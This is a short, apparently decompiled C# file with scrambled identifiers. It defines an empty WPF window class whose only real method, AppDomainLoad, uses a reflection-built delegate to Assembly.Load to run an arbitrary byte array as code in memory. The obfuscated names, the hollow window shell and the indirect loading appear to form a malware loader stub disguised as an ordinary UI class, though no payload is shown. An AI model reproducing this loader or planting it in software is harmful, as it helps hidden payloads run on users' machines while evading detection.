using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace xnbaxog;

public class poyyfat : Window, IComponentConnector
{
	internal delegate Assembly ghclzgv(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] glxifit)
	{
		return ((ghclzgv)Delegate.CreateDelegate(typeof(ghclzgv), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(glxifit);
	}

	private void P(int connectionId, object target)
	{
	}
}
